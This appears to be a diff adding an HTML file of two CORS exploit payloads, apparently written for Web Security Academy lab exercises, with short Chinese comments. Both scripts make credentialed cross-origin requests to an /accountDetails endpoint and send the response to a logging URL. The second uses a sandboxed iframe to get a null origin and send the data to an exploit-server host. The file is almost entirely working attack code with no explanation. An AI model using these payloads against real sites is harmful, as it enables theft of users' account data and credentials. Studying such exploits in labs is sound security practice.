@@ -1,0 +1,39 @@
+<!--CORS攻击注入脚本-->
+
+<html>
+
+<body>
+<script>
+  var req = new XMLHttpRequest();
+  var url = "https://ac441f881e98abeac0a11a0800cc00aa.web-security-academy.net"
+  req.onload = reqListener;
+  req.open('get', url + '/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+
+  function reqListener() {
+    location='/log?key='+this.responseText;
+  };
+</script>
+</body>
+</html>
+
+
+
+<!--绕开白名单-->
+<html>
+
+<body>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://acdc1fbd1ea939a9c01b1b72008a006d.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+    <!--  这里因为使用了iframe所以要制定具体的url-->
+        location='https://exploit-ac441fe01e96399ec0de1bf801d0007a.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+</body>
+</html>
